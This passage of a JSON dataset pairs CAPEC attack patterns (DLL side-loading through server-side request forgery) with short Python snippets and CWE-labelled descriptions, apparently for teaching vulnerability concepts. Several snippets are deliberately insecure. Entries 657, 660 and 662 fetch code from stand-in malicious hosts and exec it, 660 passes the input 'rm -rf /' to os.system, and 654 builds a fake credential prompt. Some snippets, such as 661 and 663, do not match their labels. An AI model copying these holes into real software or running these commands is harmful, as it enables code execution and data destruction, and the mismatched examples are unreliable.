        "code_snippet": "import ctypes\nimport os\nimport sys\n\n# Vulnerable function to load a DLL from an untrusted source\n# CWE-114: Process Control\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\ndef load_untrusted_dll(dll_path):\n    try:\n        ctypes.CDLL(dll_path)\n        print(f\"Loaded DLL from {dll_path}\")\n    except Exception as e:\n        print(f\"Failed to load DLL: {e}\")\n\n# Example usage\nif __name__ == \"__main__\":\n    if len(sys.argv) != 2:\n        print(\"Usage: python script.py <path_to_dll>\")\n        sys.exit(1)\n\n    dll_path = sys.argv[1]\n    load_untrusted_dll(dll_path)\n",
        "description": "This Python code snippet demonstrates a vulnerable function that loads a DLL from an untrusted source, embodying the main idea of the CAPEC 'Inclusion of Code in Existing Process'. The function `load_untrusted_dll` uses the `ctypes` library to load a DLL specified by the user. This represents CWE-114 (Process Control) and CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) as it allows the execution of potentially malicious code from an untrusted source. An attacker could exploit this vulnerability to inject arbitrary code into the address space of a running process, potentially leading to privilege escalation or evasion of detection defenses."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "import os\nimport ctypes\n\n# Simulate a vulnerable application loading a DLL\n# This is an example of CWE-427: Uncontrolled Search Path Element\n# and CWE-426: Untrusted Search Path\n\ndef load_dll(dll_name):\n    try:\n        # Attempt to load the DLL from the current directory\n        dll_path = os.path.join(os.getcwd(), dll_name)\n        ctypes.CDLL(dll_path)\n        print(f\"Loaded {dll_name} from {dll_path}\")\n    except OSError as e:\n        print(f\"Failed to load {dll_name}: {e}\")\n\n# Example usage\nload_dll('example.dll')\n",
        "description": "This Python code snippet demonstrates a simplified version of a DLL side-loading vulnerability. The `load_dll` function attempts to load a DLL from the current working directory using the `ctypes.CDLL` function. This represents CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path), as the DLL is loaded from a potentially untrusted location. An attacker could place a malicious DLL named 'example.dll' in the current directory, which would then be loaded by the application instead of the legitimate DLL, leading to potential exploitation."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "import os\nimport shutil\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\n# Setting weak permissions for a critical binary\ncritical_binary = '/path/to/critical/binary'\nos.chmod(critical_binary, 0o777)  # World-writable permissions\n\n# CWE-426: Untrusted Search Path\n# Using an untrusted search path to locate binaries\nuntrusted_path = '/untrusted/path'\nif untrusted_path not in os.environ['PATH']:\n    os.environ['PATH'] += os.pathsep + untrusted_path\n\n# CWE-78: OS Command Injection\n# Executing a command with untrusted input\nuser_input = 'malicious_command'\nos.system(f'/bin/sh -c {user_input}')\n\n# CWE-428: Unquoted Search Path or Element\n# Using an unquoted search path element\nunquoted_path = '/path with spaces'\nif unquoted_path not in os.environ['PATH']:\n    os.environ['PATH'] += os.pathsep + unquoted_path\n\n# CWE-506: Embedded Malicious Code\n# Replacing a critical binary with malicious code\nmalicious_binary = '/path/to/malicious/binary'\nshutil.copy(malicious_binary, critical_binary)",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Replace Binaries'. It sets weak permissions on a critical binary (CWE-732), uses an untrusted search path (CWE-426), executes a command with untrusted input (CWE-78), includes an unquoted search path element (CWE-428), and replaces a critical binary with a malicious one (CWE-506). The code highlights how an adversary could exploit these weaknesses to replace binaries with malware, potentially executing it with higher system permissions."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "import os\n\n# CWE-552: Files or Directories Accessible to External Parties\n# CWE-267: Privilege Defined With Unsafe Actions\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-427: Uncontrolled Search Path Element\n# CWE-40: Path Traversal: '\\\\UNC\\share\\name\\' (Windows UNC Share)\n\ndef list_shared_directories(base_path):\n    try:\n        # CWE-427: Uncontrolled Search Path Element\n        for root, dirs, files in os.walk(base_path):\n            for dir_name in dirs:\n                dir_path = os.path.join(root, dir_name)\n                # CWE-552: Files or Directories Accessible to External Parties\n                if os.access(dir_path, os.R_OK):\n                    print(f\"Accessible directory: {dir_path}\")\n                    # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                    with open(os.path.join(dir_path, 'sensitive_info.txt'), 'r') as file:\n                        print(file.read())\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# CWE-40: Path Traversal: '\\\\UNC\\share\\name\\' (Windows UNC Share)\nlist_shared_directories('\\\\UNC\\share\\name\\')",
        "description": "This Python code snippet demonstrates the identification of shared directories on a system, which can be exploited by an adversary to locate and collect sensitive information or map potential routes for lateral movement within a network. The function `list_shared_directories` takes a base path (in this case, a Windows UNC share path) and recursively lists directories that are accessible. If a directory is accessible, it attempts to read a file named 'sensitive_info.txt' within that directory, potentially exposing sensitive information to unauthorized actors. The code embodies the main idea of CAPEC-115 by showing how shared directories can be identified and exploited, and it incorporates related CWEs to highlight various security weaknesses such as uncontrolled search paths, exposure of sensitive information, and improper access control."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "import hashlib\nimport socket\n\n# Simulate storing password hashes\nstored_hashes = {\n    'user1': '5f4dcc3b5aa765d61d8327deb882cf99',  # hash for 'password'\n}\n\n# Simulate receiving a hash from a client\nclient_hash = '5f4dcc3b5aa765d61d8327deb882cf99'  # hash for 'password'\n\n# Authentication function\ndef authenticate(user, received_hash):\n    if user in stored_hashes and stored_hashes[user] == received_hash:\n        return True\n    return False\n\n# Simulate network communication (capture-replay vulnerability)\ndef simulate_network_communication():\n    # Simulate capturing the hash over the network\n    captured_hash = client_hash\n    # Replay the captured hash\n    if authenticate('user1', captured_hash):\n        print('Authentication successful (replay attack)')\n    else:\n        print('Authentication failed')\n\nsimulate_network_communication()",
        "description": "This Python code snippet demonstrates a simplified version of a 'Pass The Hash' attack, where an adversary captures and replays a password hash to authenticate as a legitimate user. The code stores password hashes and simulates receiving a hash from a client. The `authenticate` function checks if the received hash matches the stored hash for a given user. The `simulate_network_communication` function demonstrates a capture-replay vulnerability by capturing the hash over the network and replaying it to authenticate successfully. This example highlights the risks associated with using password hashes for authentication and the potential for capture-replay attacks."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "import socket\nimport ssl\n\n# Simulate insecure storage of credentials\ncredentials = {'username': 'admin', 'password': 'password123'}\n\n# Simulate insecure transmission of credentials\ndef send_credentials(credentials):\n    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)\n    context.check_hostname = False\n    context.verify_mode = ssl.CERT_NONE\n\n    with socket.create_connection(('example.com', 443)) as sock:\n        with context.wrap_socket(sock, server_hostname='example.com') as ssock:\n            ssock.sendall(f\"{credentials['username']}:{credentials['password']}\".encode())\n\n# Simulate capture-replay attack\ncaptured_ticket = \"captured_ticket_data\"\n\n# Simulate authentication bypass using captured ticket\ndef authenticate_with_ticket(ticket):\n    with socket.create_connection(('example.com', 443)) as sock:\n        with context.wrap_socket(sock, server_hostname='example.com') as ssock:\n            ssock.sendall(ticket.encode())\n\n# Send credentials (insecurely)\nsend_credentials(credentials)\n\n# Authenticate using captured ticket\nauthenticate_with_ticket(captured_ticket)",
        "description": "This Python code snippet demonstrates the main idea of the CAPEC 'Use of Captured Tickets (Pass The Ticket)' by simulating insecure storage and transmission of credentials, and a capture-replay attack using a captured Kerberos ticket. The 'send_credentials' function transmits credentials insecurely, while the 'authenticate_with_ticket' function simulates an authentication bypass using a captured ticket. The code highlights vulnerabilities such as insufficiently protected credentials (CWE-522), authentication bypass by capture-replay (CWE-294), and the use of single-factor authentication (CWE-308)."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "import os\nimport winreg\n\n# Function to get list of USB devices from Windows registry\ndef get_usb_devices():\n    usb_devices = []\n    try:\n        reg = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)\n        key = winreg.OpenKey(reg, r'SYSTEM\\CurrentControlSet\\Enum\\USBSTOR')\n        for i in range(0, winreg.QueryInfoKey(key)[0]):\n            device = winreg.EnumKey(key, i)\n            usb_devices.append(device)\n    except Exception as e:\n        print(f\"Error accessing registry: {e}\")\n    return usb_devices\n\n# Function to check for iOS backups\ndef check_ios_backups():\n    ios_backup_path = os.path.expanduser('~\\AppData\\Roaming\\Apple Computer\\MobileSync\\Backup')\n    if os.path.exists(ios_backup_path):\n        return os.listdir(ios_backup_path)\n    return []\n\n# Main function to gather peripheral information\nif __name__ == '__main__':\n    usb_devices = get_usb_devices()\n    ios_backups = check_ios_backups()\n    print(f\"USB Devices: {usb_devices}\")\n    print(f\"iOS Backups: {ios_backups}\")",
        "description": "This Python code snippet demonstrates how an adversary might gather information about peripheral devices connected to a Windows system, specifically USB devices and iOS backups. The `get_usb_devices` function accesses the Windows registry to list connected USB devices, while the `check_ios_backups` function checks for the presence of iOS backups in a typical directory. This code embodies the concept of 'Peripheral Footprinting' by attempting to obtain information about attached peripherals, which could be useful for further attacks. The code also touches on related CWEs, such as exposure of sensitive information (CWE-200, CWE-497) and improper handling of system information (CWE-67)."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "import winreg\n\ndef collect_registry_data():\n    try:\n        registry_path = r'SOFTWARE\\ExampleSoftware'\n        registry_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_path, 0, winreg.KEY_READ)\n        value, regtype = winreg.QueryValueEx(registry_key, 'SensitiveData')\n        print(f'Sensitive Data: {value}')\n        winreg.CloseKey(registry_key)\n    except Exception as e:\n        print(f'Error accessing registry: {e}')\n\nif __name__ == '__main__':\n    collect_registry_data()",
        "description": "This Python code snippet demonstrates how an adversary might exploit improper authorization and cleartext storage in the Windows Registry to collect sensitive data. The function `collect_registry_data` attempts to read a registry key that contains sensitive information ('SensitiveData') stored in cleartext. The code does not perform any authorization checks, assuming the script has the necessary permissions to access the registry key. This represents the CAPEC scenario where an adversary gathers system-specific data and sensitive information from the registry, leveraging weaknesses such as improper authorization (CWE-285) and cleartext storage (CWE-314)."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "import pyautogui\nimport time\nimport os\n\n# Function to capture screenshots\ndef capture_screenshots(interval, duration, save_path):\n    end_time = time.time() + duration\n    while time.time() < end_time:\n        screenshot = pyautogui.screenshot()\n        timestamp = int(time.time())\n        screenshot.save(os.path.join(save_path, f'screenshot_{timestamp}.png'))\n        time.sleep(interval)\n\n# Example usage\nif __name__ == '__main__':\n    save_path = '/path/to/save/screenshots'\n    os.makedirs(save_path, exist_ok=True)\n    capture_screenshots(interval=5, duration=60, save_path=save_path)",
        "description": "This Python code snippet demonstrates how an adversary could exploit the system's screen capture functionality to gather sensitive information. The `capture_screenshots` function takes screenshots at regular intervals (every 5 seconds) for a specified duration (60 seconds) and saves them to a specified directory. This can be used to monitor and capture sensitive information displayed on the screen over time. The code embodies the main idea of CAPEC-Collect Data from Screen Capture and highlights potential vulnerabilities such as CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by saving screenshots without proper access control."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
        "code_snippet": "import os\n\n# Function to check file extension\ndef is_safe_file(file_path):\n    allowed_extensions = ['.txt', '.jpg', '.png']\n    file_extension = os.path.splitext(file_path)[1]\n    if file_extension in allowed_extensions:\n        return True\n    return False\n\n# Example usage\nfile_path = 'example.txt '\nif is_safe_file(file_path):\n    print('File is safe to process.')\nelse:\n    print('File is not safe to process.')",
        "description": "This Python code snippet demonstrates a vulnerability related to the CAPEC 'Adding a Space to a File Extension' and the associated CWEs. The function `is_safe_file` checks if a file has an allowed extension by splitting the file path and comparing the extension against a list of allowed extensions. However, the code does not properly handle trailing spaces in the file name, which can lead to incorrect classification of the file. For example, 'example.txt ' (with a trailing space) would not be recognized as a '.txt' file, potentially allowing an attacker to bypass security checks. This snippet highlights the importance of properly sanitizing and validating file paths to prevent such vulnerabilities."
    },
    {
        "capec_id": "650",
        "capec_name": "Upload a Web Shell to a Web Server",
        "code_snippet": "import os\nfrom flask import Flask, request, redirect, url_for\nfrom werkzeug.utils import secure_filename\n\napp = Flask(__name__)\nUPLOAD_FOLDER = '/path/to/upload'\napp.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER\n\n@app.route('/upload', methods=['GET', 'POST'])\ndef upload_file():\n    if request.method == 'POST':\n        # Check if the post request has the file part\n        if 'file' not in request.files:\n            return 'No file part'\n        file = request.files['file']\n        # If user does not select file, browser also\n        # submit an empty part without filename\n        if file.filename == '':\n            return 'No selected file'\n        # Save the file without proper validation\n        filename = secure_filename(file.filename)\n        file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))\n        return 'File successfully uploaded'\n    return '''\n    <!doctype html>\n    <title>Upload new File</title>\n    <h1>Upload new File</h1>\n    <form method=post enctype=multipart/form-data>\n      <input type=file name=file>\n      <input type=submit value=Upload>\n    </form>\n    '''\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a simple file upload functionality using the Flask web framework. The code allows users to upload files to a specified directory on the server. However, it lacks proper validation and security measures, making it vulnerable to several issues described in the CAPEC and related CWEs. Specifically, it allows unrestricted upload of files (CWE-434), which could include dangerous types like web shells. The code also does not implement proper authentication (CWE-287) or server-side security enforcement (CWE-602), making it easier for an attacker to exploit the upload functionality. By uploading a malicious web shell, an attacker could gain unauthorized access to the server and execute commands with elevated privileges."
    },
    {
        "capec_id": "651",
        "capec_name": "Eavesdropping",
        "code_snippet": "import sounddevice as sd\nimport numpy as np\nimport scipy.io.wavfile as wav\n\n# Record audio for 10 seconds\nfs = 44100  # Sample rate\nseconds = 10  # Duration of recording\nprint('Recording...')\nmyrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)\nsd.wait()  # Wait until recording is finished\nprint('Recording finished')\n\n# Save the recording to a file\nwav.write('eavesdropped_audio.wav', fs, myrecording)\n\n# Simulate exposure of sensitive information\nwith open('eavesdropped_audio.wav', 'rb') as f:\n    audio_data = f.read()\n\n# Transmit the audio data in cleartext (vulnerable to interception)\nprint('Transmitting audio data...')\n# Here we would normally send the data over a network, but for simplicity, we just print it\nprint(audio_data)",
        "description": "This Python code snippet demonstrates a basic eavesdropping scenario where audio is recorded using a microphone and then saved to a file. The recorded audio is then read from the file and transmitted in cleartext, which is vulnerable to interception. This embodies the CAPEC concept of eavesdropping by capturing raw audio and exposing sensitive information (CWE-200). The cleartext transmission of the audio data (CWE-319) further highlights the vulnerability. The code does not include any protection mechanisms, making it susceptible to unauthorized access and eavesdropping."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import socket\nimport ssl\n\n# CWE-522: Insufficiently Protected Credentials\n# CWE-308: Use of Single-factor Authentication\n# CWE-294: Authentication Bypass by Capture-replay\n\n# Simulate a Kerberos authentication request\nserver_address = ('example.com', 88)\n\n# Create a socket and wrap it with SSL for encryption\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nssl_sock = ssl.wrap_socket(sock)\n\ntry:\n    ssl_sock.connect(server_address)\n    \n    # CWE-522: Transmitting credentials insecurely\n    kerberos_ticket = 'fake_kerberos_ticket'\n    ssl_sock.sendall(kerberos_ticket.encode('utf-8'))\n    \n    # CWE-294: Capture-replay vulnerability\n    response = ssl_sock.recv(1024)\n    if response == b'OK':\n        print('Authenticated successfully')\n    else:\n        print('Authentication failed')\nfinally:\n    ssl_sock.close()",
        "description": "This Python code snippet demonstrates a simplified and vulnerable Kerberos authentication process. It highlights several security weaknesses: \n\n1. **CWE-522: Insufficiently Protected Credentials** - The code transmits a fake Kerberos ticket over an SSL connection, which may not be sufficient to protect against interception if SSL is improperly configured.\n\n2. **CWE-308: Use of Single-factor Authentication** - The code uses a single Kerberos ticket for authentication without additional factors, making it susceptible to compromise.\n\n3. **CWE-294: Authentication Bypass by Capture-replay** - The code does not implement measures to prevent replay attacks, allowing an adversary to capture and replay the Kerberos ticket to gain unauthorized access.\n\nThe main idea of the CAPEC is to show how an adversary can use known Kerberos credentials to gain authenticated access to systems. This code snippet embodies that by simulating the transmission and potential misuse of a Kerberos ticket."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import os\nimport getpass\n\n# Hardcoded credentials (CWE-522)\nUSERNAME = 'admin'\nPASSWORD = 'password123'\n\n# Function to authenticate user\ndef authenticate(username, password):\n    # Single-factor authentication (CWE-308)\n    if username == USERNAME and password == PASSWORD:\n        print('Authentication successful!')\n        return True\n    else:\n        print('Authentication failed!')\n        return False\n\n# Main function\nif __name__ == '__main__':\n    # Get credentials from user\n    user = input('Enter username: ')\n    pwd = getpass.getpass('Enter password: ')\n\n    # Attempt to authenticate\n    if authenticate(user, pwd):\n        # Perform authorized actions\n        print('Performing authorized actions...')\n    else:\n        print('Access denied.')",
        "description": "This Python code snippet demonstrates a simple authentication mechanism that embodies the main idea of CAPEC-Use of Known Operating System Credentials. The code uses hardcoded credentials (CWE-522) and single-factor authentication (CWE-308) to authenticate a user. The user is prompted to enter a username and password, which are then checked against the hardcoded values. If the credentials match, the user is authenticated and allowed to perform authorized actions. This example highlights the vulnerabilities associated with using known or easily guessable credentials and relying on single-factor authentication, making the system susceptible to unauthorized access."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import tkinter as tk\nfrom tkinter import simpledialog\n\n# CWE-798: Use of Hard-coded Credentials\nHARDCODED_USERNAME = 'admin'\nHARDCODED_PASSWORD = 'password123'\n\n# Function to simulate credential prompt impersonation\ndef fake_credential_prompt():\n    root = tk.Tk()\n    root.withdraw()  # Hide the main window\n\n    # CWE-1021: Improper Restriction of Rendered UI Layers or Frames\n    # Display a fake credential prompt\n    username = simpledialog.askstring('Login', 'Enter your username:')\n    password = simpledialog.askstring('Login', 'Enter your password:', show='*')\n\n    # CWE-522: Insufficiently Protected Credentials\n    # Here we just print the credentials, but in a real attack, they would be sent to an attacker-controlled server\n    print(f'Captured credentials - Username: {username}, Password: {password}')\n\n    root.destroy()\n\n# CWE-556: ASP.NET Misconfiguration: Use of Identity Impersonation\n# This is a Python example, but the concept is similar: running code with unnecessary privileges\nif __name__ == '__main__':\n    fake_credential_prompt()",
        "description": "This Python code snippet demonstrates a simple example of credential prompt impersonation, where a malicious application creates a fake login prompt to capture user credentials. The code uses Tkinter to create a GUI prompt that asks for a username and password. The captured credentials are then printed, simulating how an attacker might steal them. The code also highlights several related CWEs: hard-coded credentials (CWE-798), improper restriction of UI layers (CWE-1021), and insufficiently protected credentials (CWE-522). The concept of running code with unnecessary privileges (CWE-556) is mentioned to emphasize the potential risks of such practices."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-532: Insertion of Sensitive Information into Log File\n# CWE-541: Inclusion of Sensitive Information in an Include File\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef create_large_file_with_sensitive_data():\n    # Create a temporary file (CWE-377)\n    temp_file = tempfile.NamedTemporaryFile(delete=False)\n    try:\n        # Add sensitive information (CWE-541, CWE-532)\n        sensitive_data = 'username=admin\\npassword=secret\\n'\n        temp_file.write(sensitive_data.encode())\n\n        # Add large amount of data to bypass security tools (CAPEC)\n        large_data = 'A' * (10**7)  # 10 MB of data\n        temp_file.write(large_data.encode())\n\n        # Log the file creation (CWE-532)\n        with open('logfile.log', 'a') as log_file:\n            log_file.write(f'Created temp file: {temp_file.name}\\n')\n\n        # Simulate file upload with dangerous type (CWE-434, CWE-646)\n        uploaded_file_name = temp_file.name + '.txt'\n        os.rename(temp_file.name, uploaded_file_name)\n        print(f'File uploaded as: {uploaded_file_name}')\n    finally:\n        temp_file.close()\n\ncreate_large_file_with_sensitive_data()",
        "description": "This Python code snippet demonstrates the concept of avoiding security tool identification by adding data to a file, as described in the CAPEC. The code creates a temporary file (CWE-377) and writes sensitive information to it (CWE-541, CWE-532). It then adds a large amount of data to the file to increase its size, potentially bypassing security tools that cannot handle large files. The file creation is logged (CWE-532), and the file is renamed to simulate an upload with a potentially dangerous file type (CWE-434, CWE-646). This example highlights how an attacker might manipulate file size and content to evade detection and exploit vulnerabilities in file handling and logging mechanisms."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import random\n\nclass VoicePhishingSimulator:\n    def __init__(self):\n        self.legitimate_numbers = ['800-123-4567', '800-987-6543']\n        self.sensitive_info = {'password': 'supersecret', 'ssn': '123-45-6789'}\n\n    def receive_call(self, caller_id):\n        if caller_id not in self.legitimate_numbers:\n            print('Warning: Unverified caller ID!')\n        else:\n            self.handle_call(caller_id)\n\n    def handle_call(self, caller_id):\n        print(f'Call from {caller_id} received.')\n        if random.choice([True, False]):\n            self.expose_sensitive_info()\n        else:\n            print('No sensitive information shared.')\n\n    def expose_sensitive_info(self):\n        print(f'Exposing sensitive information: {self.sensitive_info}')\n\n# Simulate receiving a call\nsimulator = VoicePhishingSimulator()\ncaller_id = '800-000-0000'  # Example of an unverified caller ID\nsimulator.receive_call(caller_id)",
        "description": "This Python code snippet simulates a Voice Phishing attack scenario. The `VoicePhishingSimulator` class contains a list of legitimate phone numbers and some sensitive information. The `receive_call` method checks if the incoming call's caller ID is from a legitimate number. If the caller ID is not verified, it prints a warning. If the caller ID is verified, it proceeds to handle the call, where there is a random chance of exposing sensitive information. This code demonstrates the vulnerability of improper verification of the source of a communication channel (CWE-940) and the potential exposure of private personal information (CWE-359)."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import requests\n\n# URL of the supposed legitimate update server\nlegit_update_url = 'http://legit-update-server.com/update'\n\n# URL of the malicious update server (spoofed)\nmalicious_update_url = 'http://malicious-server.com/update'\n\n# Function to download and execute update\ndef download_and_execute_update(update_url):\n    response = requests.get(update_url)\n    if response.status_code == 200:\n        exec(response.text)  # CWE-494: Download of Code Without Integrity Check\n    else:\n        print('Failed to download update')\n\n# Simulate a spoofing attack by redirecting to the malicious update server\nupdate_url = malicious_update_url  # Spoofing the update URL\n\n# Download and execute the update from the spoofed URL\ndownload_and_execute_update(update_url)\n",
        "description": "This Python code snippet demonstrates a scenario where an attacker uses spoofing to trick a client into downloading and executing a malicious software update. The code initially sets a legitimate update URL but then simulates a spoofing attack by redirecting the update URL to a malicious server. The `download_and_execute_update` function downloads the update from the specified URL and executes it without verifying its integrity, embodying CWE-494 (Download of Code Without Integrity Check). This represents the main idea of the CAPEC, where an attacker uses spoofing to deliver a malicious update to the client."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import os\nimport requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious.example.com/malicious_code.py'\nresponse = requests.get(url)\nexec(response.text)  # Dangerous: executing code without integrity check\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nimport ctypes\nctypes.CDLL('/path/to/untrusted/library.so')  # Dangerous: loading untrusted library\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = os.popen('uname -a').read()  # Dangerous: exposing system information\nprint(sensitive_info)\n\n# CWE-78: OS Command Injection\nuser_input = 'some_input; rm -rf /'  # Example of malicious input\nos.system(f'echo {user_input}')  # Dangerous: OS command injection vulnerability\n\n# Hooking to bypass Root/Jailbreak detection\noriginal_check = os.system\n\ndef bypass_check(command):\n    if 'check_root' in command or 'check_jailbreak' in command:\n        return 0  # Bypass the check\n    return original_check(command)\n\nos.system = bypass_check\n\n# Example usage\nos.system('check_root')  # This will be bypassed\nos.system('echo Hello, World!')  # This will execute normally",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Root/Jailbreak Detection Evasion via Hooking' and associated CWEs. The code includes:\n\n1. **CWE-494: Download of Code Without Integrity Check** - The code downloads and executes a script from a remote URL without verifying its integrity, which can lead to execution of malicious code.\n\n2. **CWE-829: Inclusion of Functionality from Untrusted Control Sphere** - The code loads an untrusted shared library, which can introduce malicious functionality.\n\n3. **CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere** - The code retrieves and prints sensitive system information, potentially exposing it to unauthorized actors.\n\n4. **CWE-78: OS Command Injection** - The code constructs and executes an OS command using user input without proper sanitization, making it vulnerable to command injection.\n\n5. **Hooking to Bypass Root/Jailbreak Detection** - The code hooks the `os.system` function to bypass root/jailbreak detection checks by always returning success for specific commands, allowing an adversary to evade these checks and potentially escalate privileges or bypass access controls."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import os\nimport sys\nimport ctypes\n\ndef is_debugger_present():\n    return ctypes.windll.kernel32.IsDebuggerPresent() != 0\n\ndef check_root_jailbreak():\n    # Check for common root/jailbreak indicators\n    root_indicators = ['/system/bin/su', '/system/xbin/su', '/system/app/Superuser.apk']\n    for indicator in root_indicators:\n        if os.path.exists(indicator):\n            return True\n    return False\n\ndef main():\n    if is_debugger_present():\n        print('Debugger detected! Exiting...')\n        sys.exit(1)\n    if check_root_jailbreak():\n        print('Root/Jailbreak detected! Exiting...')\n        sys.exit(1)\n    print('Application running normally.')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a basic implementation of root/jailbreak detection and debugger presence check, which aligns with the CAPEC description. The `is_debugger_present` function uses the Windows API to check if a debugger is attached to the process, addressing CWE-489 (Active Debug Code). The `check_root_jailbreak` function checks for the presence of common root/jailbreak indicators on the file system, which can be bypassed if an adversary uses debugging tools to modify the application binary, addressing CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere). The `main` function exits the application if either a debugger or root/jailbreak is detected, representing the main idea of evading root/jailbreak detection via debugging."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_script.py'\nresponse = requests.get(url)\nexec(response.text)\n\n# CWE-300: Channel Accessible by Non-Endpoint\nimport socket\n\nserver_address = ('localhost', 10000)\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect(server_address)\n\ntry:\n    message = 'GET / HTTP/1.1\\r\\nHost: localhost\\r\\n\\r\\n'\n    sock.sendall(message.encode('utf-8'))\n    data = sock.recv(1024)\n    print('Received:', data.decode('utf-8'))\nfinally:\n    sock.close()\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\nuser_input = input('Enter your username: ')\nif user_input == 'admin':\n    print('Access granted')\nelse:\n    print('Access denied')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the CAPEC 'Adversary in the Browser (AiTB)'. The code first downloads and executes a script from a remote location without verifying its integrity (CWE-494). It then establishes a socket connection to a server, potentially allowing an adversary to intercept or manipulate the communication (CWE-300). Finally, it shows a simplistic client-side enforcement of security by checking user input for access control, which can be easily bypassed (CWE-602). This snippet embodies the main idea of AiTB by showcasing how an adversary can exploit these vulnerabilities to manipulate traffic and compromise security."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "import numpy as np\n\n# Simulate speculative execution by accessing array out of bounds\narray_size = 10\nsecret_data = np.random.randint(0, 256, size=array_size)\npublic_data = np.zeros(array_size)\n\n# Function to simulate speculative execution\ndef speculative_execution(index):\n    if index < array_size:\n        return secret_data[index]\n    else:\n        return public_data[index % array_size]\n\n# Simulate branch prediction failure\nfor i in range(array_size + 1):\n    try:\n        # Accessing out of bounds to trigger speculative execution\n        leaked_data = speculative_execution(i)\n        print(f\"Leaked data: {leaked_data}\")\n    except IndexError:\n        pass",
        "description": "This Python code snippet simulates the concept of 'Exploitation of Transient Instruction Execution' by mimicking speculative execution and branch prediction failures. The `speculative_execution` function attempts to access an array out of bounds, which represents speculative execution accessing sensitive data. The loop simulates a branch prediction failure by accessing indices beyond the array's bounds, potentially leaking sensitive data. This example embodies the main idea of the CAPEC by demonstrating how transient execution can expose sensitive information, leveraging the related CWEs such as non-transparent sharing of microarchitectural resources and exposure of sensitive information during transient execution."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import requests\n\n# Vulnerable function that takes a URL from user input and fetches its content\n\ndef fetch_url_content(user_input_url):\n    try:\n        response = requests.get(user_input_url)\n        return response.text\n    except requests.RequestException as e:\n        return str(e)\n\n# Example usage\nuser_input_url = input('Enter a URL to fetch content: ')\ncontent = fetch_url_content(user_input_url)\nprint(content)\n",
        "description": "This Python code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The function `fetch_url_content` takes a URL provided by the user and fetches its content using the `requests` library. The user input is not validated, allowing an attacker to submit a malicious URL. This could force the server to make requests to internal services or external third parties with the server's privileges. The code embodies CWE-918 (SSRF) by not ensuring the request is sent to an expected destination, CWE-20 (Improper Input Validation) by not validating the user input, and CWE-472 (External Control of Assumed-Immutable Web Parameter) by allowing external control over the URL parameter."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
